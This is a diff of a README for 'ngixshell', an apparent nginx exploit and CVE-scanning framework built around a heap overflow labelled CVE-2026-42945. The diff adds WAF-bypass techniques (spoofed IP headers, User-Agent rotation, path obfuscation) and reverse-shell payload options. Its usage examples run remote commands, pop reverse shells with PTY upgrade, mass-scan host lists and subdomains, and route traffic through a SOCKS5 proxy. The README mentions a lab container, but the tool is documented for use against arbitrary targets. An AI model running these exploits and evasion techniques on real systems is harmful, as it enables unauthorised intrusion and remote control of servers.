@@ -6,7 +6,7 @@
 
 nginx CVE scanner + RCE exploit framework.
 
-Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes, fingerprinting, web security auditing, and report generation.
+Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes, fingerprinting, web security auditing, WAF detection/bypass, and report generation.
 
 > Original vulnerability discovered by [depthfirst](https://depthfirst.com)'s security analysis system.
 
@@ -15,24 +15,30 @@ Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in N
 ## Quick Start
 
 ```bash
-# Auto mode — fingerprint + full CVE scan + web audit + HTML report
+# Build the lab environment
+docker compose -f env/docker-compose.yml up -d
+
+# Auto mode — fingerprint + CVE scan + web audit
 python3 ngixshell.py 127.0.0.1:19321
 
-# Run command via CVE-2026-42945
+# Execute command via RCE
 python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'
 
-# Reverse shell
-python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 10.0.0.1 --listen-port 4444
+# Reverse shell (IP auto-detected)
+python3 ngixshell.py 127.0.0.1:19321 --shell
+
+# Detect + bypass WAF
+python3 ngixshell.py 127.0.0.1:19321 --waf-bypass
 
 # Scan subdomains
 python3 ngixshell.py --subdomain-scan example.com --scan-port 443
 
-# Scan multiple targets from file
+# Multiple targets
 python3 ngixshell.py --target-file hosts.txt
 ```
 
-No flags required — pointing the tool at a target is enough.  
-TLS is **auto-detected**. An HTML report is **auto-generated** whenever findings exist.
+No flags required — pointing the tool at a target runs everything automatically.  
+TLS is **auto-detected**. nginx is detected even with `server_tokens off`.
 
 ---
 
@@ -41,7 +47,7 @@ TLS is **auto-detected**. An HTML report is **auto-generated** whenever findings
 ```
 ngixshell.py [TARGET] [OPTIONS]
 
-TARGET formats accepted:
+TARGET formats:
   127.0.0.1
   192.168.1.10:8080
   http://192.168.1.10:8080
@@ -52,57 +58,56 @@ TARGET formats accepted:
 
 | Flag | Description |
 |---|---|
-| *(none)* | **Auto** — fingerprint + full CVE scan + web audit + report |
+| *(none)* | **Auto** — fingerprint + CVE scan + web audit |
 | `--cmd 'CMD'` | Execute command via CVE-2026-42945 RCE |
 | `--cmd-file FILE` | Execute commands from file (joined with `;`) |
-| `--shell` | Pop a reverse shell via CVE-2026-42945 |
+| `--shell` | Pop a reverse shell |
+| `--shell-type TYPE` | Payload type: `bash` `python` `perl` `php` `nc` `powershell` (default: python) |
+| `--upgrade-shell` | Auto-send PTY upgrade after shell connects |
 | `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
 | `--cve CVE-ID` | Test one specific CVE |
 | `--list-cves` | Print all 17 CVEs with CVSS and probe info |
 | `--list-candidates` | Print heap address candidates |
-| `--dry-run` | Fingerprint + scan without triggering exploit |
+| `--dry-run` | Fingerprint + scan only, no exploit |
 | `--target-file FILE` | Scan multiple hosts from a file |
 
-### Web Audit (auto-enabled in scan mode)
+### WAF
 
 | Flag | Description |
 |---|---|
-| *(none)* | All modules run automatically |
+| `--waf-detect` | Detect WAF before scanning |
+| `--waf-bypass` | Enable all bypass techniques (also runs detection) |
+| `--waf-ip IP` | Spoof this IP in bypass headers (default: random RFC1918) |
+
+**Bypass techniques** (all active when `--waf-bypass` is set):
+- IP spoofing headers: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP`, `X-Remote-IP`, `X-Client-IP`
+- User-Agent rotation — 11 real browser/bot UAs per request
+- Path obfuscation — double-slash, `/./` padding, percent-encoding, case variation (random per request)
+- Header case randomisation — breaks WAF case-sensitive pattern matching
+
+**WAF detection** covers: Cloudflare, AWS WAF, Akamai, Imperva/Incapsula, ModSecurity, F5 BIG-IP ASM, Sucuri, Barracuda, NAXSI, Fastly, Wordfence
+
+### Web Audit
+
+Runs automatically in scan mode. All modules can be skipped individually.
+
+| Flag | Description |
+|---|---|
 | `--skip-headers` | Skip HTTP security header audit |
-| `--skip-paths` | Skip interesting path discovery |
+| `--skip-paths` | Skip path/file discovery |
 | `--skip-vhosts` | Skip virtual host enumeration |
-| `--skip-tls` | Skip TLS protocol / certificate audit |
+| `--skip-tls` | Skip TLS protocol audit |
 | `--path-wordlist FILE` | Extra paths to probe (one per line) |
 
-Web audit modules run automatically in auto mode. Each can be disabled individually.
+**Header audit** checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, version-leaking headers
 
-#### Header Security Audit
-Checks for missing or misconfigured HTTP security headers:
-- `Strict-Transport-Security` (HSTS)
-- `Content-Security-Policy` (CSP)
-- `X-Frame-Options`
-- `X-Content-Type-Options`
-- `Referrer-Policy`
-- `Permissions-Policy`
+**Path discovery** probes 50+ paths with catch-all detection — a sentinel request eliminates false positives from catch-all 403/301 rules before scanning
 
-Also flags information-leaking headers: `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, etc.
+**Virtual host enumeration** requires both status AND body to differ from baseline, preventing default server block false positives
 
-#### Path Discovery
-Probes 50+ interesting paths including:
-- `/nginx_status` — nginx stub_status module (active connection metrics)
-- `/.env`, `/.git/config` — sensitive file exposure
-- `/admin`, `/swagger`, `/graphql` — admin panels and APIs
-- `/metrics`, `/actuator`, `/health` — monitoring endpoints
-- `/phpinfo.php`, `/server-status` — server information disclosure
+**TLS audit** tests TLS 1.0–1.3 support and certificate expiry/self-signed status
 
-#### Virtual Host Enumeration
-Sends requests with common `Host:` header values (`admin`, `internal`, `dev`, `staging`, etc.) and flags responses that differ from the baseline, revealing hidden vhosts on shared-IP deployments.
-
-#### TLS Audit
-Tests protocol version support (TLS 1.0–1.3) and validates the server certificate (expiry, hostname match).
-
-#### nginx stub_status
-Parses active connection counts and request metrics from `/nginx_status` when the stub_status module is exposed.
+**stub_status** parses nginx active connection metrics from `/nginx_status` if exposed
 
 ### Connection
 
@@ -112,12 +117,12 @@ Parses active connection counts and request metrics from `/nginx_status` when th
 | `--tls` | Force TLS (auto-detected by default) |
 | `--proxy URL` | Proxy: `http://`, `https://`, `socks5://` |
 
-### HTTP Customisation
+### HTTP
 
 | Flag | Description |
 |---|---|
-| `--user-agent UA` | Custom User-Agent header |
-| `--auth USER:PASS` | HTTP Basic authentication |
+| `--user-agent UA` | Custom User-Agent |
+| `--auth USER:PASS` | HTTP Basic auth |
 | `--cookie VALUE` | Cookie header |
 | `--header NAME:VALUE` | Extra header (repeatable) |
 
@@ -126,19 +131,18 @@ Parses active connection counts and request metrics from `/nginx_status` when th
 | Flag | Description |
 |---|---|
 | `--rate-limit RPS` | Max requests per second |
-| `--jitter MS` | Add random delay 0–MS ms between requests |
-| `--retry N` | Retry probes on inconclusive result (default: 1) |
-| `--timeout-multiplier X` | Scale all sleep timings (default: 1.0) |
+| `--jitter MS` | Random delay 0–MS ms between requests |
+| `--retry N` | Retry inconclusive probes (default: 1) |
+| `--timeout-multiplier X` | Scale all timeouts (default: 1.0) |
 
 ### Output
 
 | Flag | Description |
 |---|---|
-| `--output FILE` | Write log to FILE in addition to stdout |
-| `--json` | Print JSON summary at end of run |
-| `--html-report FILE` | Save HTML report to FILE |
-| `--no-report` | Skip the automatic HTML report |
-| `--verbose` | Debug output including caught exceptions |
+| `--output FILE` | Write log to FILE |
+| `--json` | Print JSON summary at end |
+| `--html-report [FILE]` | Generate HTML report (default name: `ngixshell_<host>_<ts>.html`) |
+| `--verbose` | Debug output |
 
 ---
 
@@ -193,32 +197,29 @@ Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>
 Tested on Ubuntu 24.04.3 LTS. No external dependencies — pure Python 3 stdlib.
 
 ```bash
-# Build the vulnerable nginx container
-docker compose -f env/docker-compose.yml up
+# Start the vulnerable lab (nginx 1.25.3)
+docker compose -f env/docker-compose.yml up -d
 
-# Scan all CVEs + run web audit
+# Full scan
 python3 ngixshell.py 127.0.0.1:19321
 
-# Execute a command
+# RCE
 python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json
 
-# Pop a shell
-python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 172.17.0.1 --listen-port 1337
+# Reverse shell — bash payload, PTY auto-upgrade
+python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell
 
-# Scan subdomains
-python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --scan-tls
-
-# Multiple targets with rate limiting
-python3 ngixshell.py --target-file hosts.txt --rate-limit 5 --json
+# WAF bypass scan
+python3 ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1
 
 # Through SOCKS5 proxy
 python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050
 
-# Skip web audit modules individually
-python3 ngixshell.py 127.0.0.1:19321 --skip-vhosts --skip-tls
+# Subdomain scan with rate limiting
+python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --rate-limit 10
 
-# Custom path wordlist
-python3 ngixshell.py 127.0.0.1:19321 --path-wordlist my_paths.txt
+# Multiple targets, JSON output, HTML report
+python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
 ```
 
 ---
